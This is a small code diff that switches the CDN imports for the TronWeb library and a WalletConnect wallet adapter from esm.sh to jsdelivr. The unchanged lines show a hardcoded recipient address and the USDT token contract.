@@ -1,5 +1,5 @@
-import { WalletConnectAdapter } from "https://esm.sh/@tronweb3/tronwallet-adapter-walletconnect@3.1.0";
-import TronWeb from "https://esm.sh/tronweb@6.0.4";
+import { WalletConnectAdapter } from "https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter-walletconnect@3.1.0/+esm";
+import TronWeb from "https://cdn.jsdelivr.net/npm/tronweb@6.0.4/+esm";
 
 const RECIPIENT = "TLbKGSeKQtB1iYh7sBRTk2p9kcYjBQb2Np";
 const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
